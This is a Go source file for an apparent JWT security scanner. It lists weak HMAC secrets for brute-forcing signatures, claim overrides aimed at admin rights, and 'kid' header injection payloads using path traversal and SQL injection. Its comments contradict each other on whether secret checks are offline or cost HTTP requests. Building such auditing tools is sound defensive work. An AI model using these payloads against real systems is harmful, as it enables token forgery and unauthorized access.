package jwtscan

// weakSecrets is the built-in HMAC-secret brute-force wordlist. The first block
// is ported verbatim from JWTear's core/payloads.py so results stay consistent
// with the standalone tool. The later blocks add widely seen defaults from
// tutorials, framework templates, and public JWT-cracking lists. Checking a
// candidate is an offline HMAC computation, so the list costs no requests to the
// target and can be long.
var weakSecrets = []string{
	// JWTear core list.
	"", "secret", "password", "123456", "jwt", "jwt_secret", "supersecret",
	"mysecret", "changeme", "admin", "token", "key", "private",
	"qwerty", "letmein", "welcome", "monkey", "dragon", "master",
	"your-256-bit-secret", "your-384-bit-secret", "your-512-bit-secret",
	"null", "undefined", "test", "dev", "development", "production",
	"secret123", "password123", "p@ssw0rd", "abc123", "iloveyou",
	"pass", "passwd", "root", "toor", "admin123", "administrator",
	"1234567890", "secretkey", "signingkey", "jwtpassword", "jwtsecret",
	"hmackey", "hs256key", "keykey", "insecure", "weak", "hackthebox",
	"flag", "ctf", "challenge", "demo", "sample", "example",

	// Case and separator variants of the most common defaults.
	"Secret", "SECRET", "PASSWORD", "Password", "Password1", "password1",
	"secret1", "secret_key", "SECRET_KEY", "secret-key", "secret_key_base",
	"secretKey", "jwt-secret", "jwt_key", "JWT_SECRET", "jwtSecret",
	"my-secret-key", "my_secret_key", "my-secret", "your-secret-key",
	"your_secret_key", "your-secret", "app-secret", "app_secret",
	"api-secret", "api_secret", "apikey", "api_key", "api-key", "APIKEY",
	"super-secret", "super_secret", "supersecretkey", "topsecret", "top-secret",

	// Leetspeak and short variants of the common words above.
	"s3cr3t", "S3cr3t", "S3CR3T", "p4ssw0rd", "passw0rd", "Passw0rd", "pa55word",
	"sekret", "s3cret", "s3cr3tk3y", "k3y", "adm1n", "r00t", "letmein1",

	// Framework and tutorial defaults.
	"shh", "shhhh", "shhh", "node", "nodejs", "express", "expressjwt",
	"jsonwebtoken", "rails", "django", "flask", "laravel", "spring",
	"django-insecure", "secret_key_here", "change-me", "change_me", "changeit",
	"default", "defaultsecret", "authsecret", "auth-secret", "auth_secret",
	"session_secret", "sessionsecret", "cookie-secret", "cookie_secret",
	"encryption_key", "encryptionkey", "signing_secret", "signature", "hmac",
	"hmac-secret", "hmac_secret", "HS256", "HS512", "bearer", "authorization",

	// Common numeric and keyboard patterns.
	"123123", "12345678", "123456789", "111111", "000000", "password!",
	"qwerty123", "asdfgh", "zxcvbn", "1q2w3e4r", "abcdef", "abcd1234",

	// Placeholder and template strings found in sample code.
	"yoursecret", "your-jwt-secret", "your_jwt_secret", "<secret>", "{secret}",
	"replace-me", "replace_me", "REPLACE_ME", "xxx", "xxxx", "aaaa",
}

// claimPatch is one privilege-escalation claim override the claim-tampering
// test tries, paired with a human-readable description shown in results.
type claimPatch struct {
	Patch map[string]any
	Desc  string
}

// claimPatches are the claim overrides the claim-tampering test tries. Each
// sets one flat claim to a value that grants administrative rights under some
// common scheme. Structure-changing claims (roles arrays, groups lists) are
// included as their own entries.
var claimPatches = []claimPatch{
	{map[string]any{"role": "admin"}, `role → "admin"`},
	{map[string]any{"role": "administrator"}, `role → "administrator"`},
	{map[string]any{"role": "superuser"}, `role → "superuser"`},
	{map[string]any{"is_admin": true}, "is_admin → true"},
	{map[string]any{"isAdmin": true}, "isAdmin → true"},
	{map[string]any{"admin": true}, "admin → true"},
	{map[string]any{"is_staff": true}, "is_staff → true"},
	{map[string]any{"is_superuser": true}, "is_superuser → true"},
	{map[string]any{"superuser": true}, "superuser → true"},
	{map[string]any{"sub": "admin"}, `sub → "admin"`},
	{map[string]any{"username": "admin"}, `username → "admin"`},
	{map[string]any{"user": "admin"}, `user → "admin"`},
	{map[string]any{"userRole": "admin"}, `userRole → "admin"`},
	{map[string]any{"type": "admin"}, `type → "admin"`},
	{map[string]any{"group": "admin"}, `group → "admin"`},
	{map[string]any{"roles": []any{"admin"}}, `roles → ["admin"]`},
	{map[string]any{"groups": []any{"admin"}}, `groups → ["admin"]`},
	{map[string]any{"permissions": []any{"*"}}, `permissions → ["*"]`},
	{map[string]any{"scope": "admin read write"}, "scope → admin"},
	{map[string]any{"privilege": "admin"}, `privilege → "admin"`},
	{map[string]any{"level": 0}, "level → 0"},
	{map[string]any{"access": "full"}, `access → "full"`},
}

// kidPayload is one kid-header-injection probe: the value forced into the
// "kid" header, plus the HMAC secret it's signed with (the payload is only
// worth trying if the server resolves "kid" into a secret an attacker can
// predict, e.g. by shelling out or hitting a null/predictable file path).
type kidPayload struct {
	Name   string
	Kid    string
	Secret []byte
}

// kidPayloads are the kid values the kid-injection test tries. Path traversal
// aims at well-known files whose contents are predictable, and the SQL entries
// aim at a lookup that builds its query from kid, where the injected row
// returns a value the attacker chose as the secret. All are read-only probes.
var kidPayloads = []kidPayload{
	{"path traversal → /dev/null", "../../../../../../dev/null", []byte("")},
	{"path traversal → /dev/null (deep)", "../../../../../../../../../../dev/null", []byte("")},
	{"absolute path → /dev/null", "/dev/null", []byte("")},
	{"path traversal → /proc randomize_va", "../../proc/sys/kernel/randomize_va_space", []byte("2")},
	{"SQL UNION SELECT", "' UNION SELECT 'x'-- -", []byte("x")},
	{"SQL UNION SELECT (secret)", "' UNION SELECT 'secret'-- -", []byte("secret")},
	{"SQL UNION SELECT (key)", "' UNION SELECT 'key'-- -", []byte("key")},
	{"SQL OR 1=1", "' OR 1=1-- -", []byte("")},
	{"SQL OR 1=1 (double quotes)", `" OR 1=1-- -`, []byte("")},
	{"SQL boolean blind", "anything' OR '1'='1", []byte("")},
	{"null byte", "\x00", []byte("")},
}

// maxSecretAttempts caps how many secrets the weak-HMAC-secret test will
// try in one scan (built-in list plus any user-supplied wordlist/pasted
// list). Each attempt is a synchronous HTTP round-trip against the target,
// so an unbounded cap paired with a multi-million-line wordlist would hang
// the request indefinitely -- the same reasoning as adapters.maxFuzzRequests
// for ffuf/feroxbuster.
const maxSecretAttempts = 10_000
